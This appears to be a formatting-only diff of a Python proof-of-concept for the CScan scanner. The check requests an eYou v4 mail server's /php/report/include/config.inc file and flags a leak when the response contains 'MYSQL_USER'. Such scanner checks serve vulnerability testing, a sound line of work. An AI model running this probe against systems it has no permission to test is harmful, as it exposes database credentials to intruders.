@@ -1,21 +1,22 @@
 # coding: utf-8
 
-from CScanPoc.thirdparty import requests,hackhttp
+from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 hh = hackhttp.hackhttp()
 
+
 class Vuln(ABVuln):
-    vuln_id = 'eYou_0016' # 平台漏洞编号，留空
-    name = 'eYou v4 /php/report/include/config.inc 信息泄露' # 漏洞名称
-    level = VulnLevel.HIGH # 漏洞危害级别
-    type = VulnType.INFO_LEAK # 漏洞类型
+    vuln_id = 'eYou_0016'  # 平台漏洞编号，留空
+    name = 'eYou v4 /php/report/include/config.inc 信息泄露'  # 漏洞名称
+    level = VulnLevel.HIGH  # 漏洞危害级别
+    type = VulnType.INFO_LEAK  # 漏洞类型
     disclosure_date = '2015-11-13'  # 漏洞公布时间
     desc = '''
         eYou v4 /php/report/include/config.inc 信息泄露漏洞
-    ''' # 漏洞描述
-    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0143760
-    cnvd_id = 'Unknown' # cnvd漏洞编号
-    cve_id = 'Unknown' #cve编号
+    '''  # 漏洞描述
+    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=0143760
+    cnvd_id = 'Unknown'  # cnvd漏洞编号
+    cve_id = 'Unknown'  # cve编号
     product = 'eYou'  # 漏洞应用名称
     product_version = 'v4'  # 漏洞应用版本
 
@@ -23,7 +24,7 @@ class Vuln(ABVuln):
 class Poc(ABPoc):
     poc_id = 'b348daec-b192-4e27-8b7e-169bf610c018'
     author = '国光'  # POC编写者
-    create_date = '2018-05-25' # POC创建时间
+    create_date = '2018-05-25'  # POC创建时间
 
     def __init__(self):
         super(Poc, self).__init__(Vuln())
@@ -34,7 +35,8 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             arg = '{target}'.format(target=self.target)
             url = arg
-            code, head, res, errcode, _ = hh.http(url + '/php/report/include/config.inc')
+            code, head, res, errcode, _ = hh.http(
+                url + '/php/report/include/config.inc')
             if code == 200 and 'MYSQL_USER' in res:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
